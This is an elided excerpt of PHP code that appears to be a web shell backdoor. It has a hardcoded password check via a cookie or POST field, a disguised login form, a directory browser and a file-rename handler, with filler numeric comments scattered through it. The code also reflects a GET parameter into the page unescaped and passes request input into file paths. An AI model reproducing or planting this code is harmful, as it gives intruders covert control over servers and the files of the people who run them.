...
$auth_key = "4c0feaee60184b6c9aada7a80ec8429a";
...
$pass = false;
if (isset($_COOKIE['pw_name_70098'])) {
    if(($_COOKIE['pw_name_70098']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_70098'])) {
        if(($_POST['pw_name_70098']) == $auth_key) {
            setcookie("pw_name_70098", $_POST['pw_name_70098']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_70098' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1725381661650046 1725381661510181 1725381661105372 1725381661174541
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1725381661650046 1725381661510181 1725381661105372 1725381661174541
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1725381661650046 1725381661510181 1725381661105372 1725381661174541
            $name = PATH . "/" . $_GET['r'];
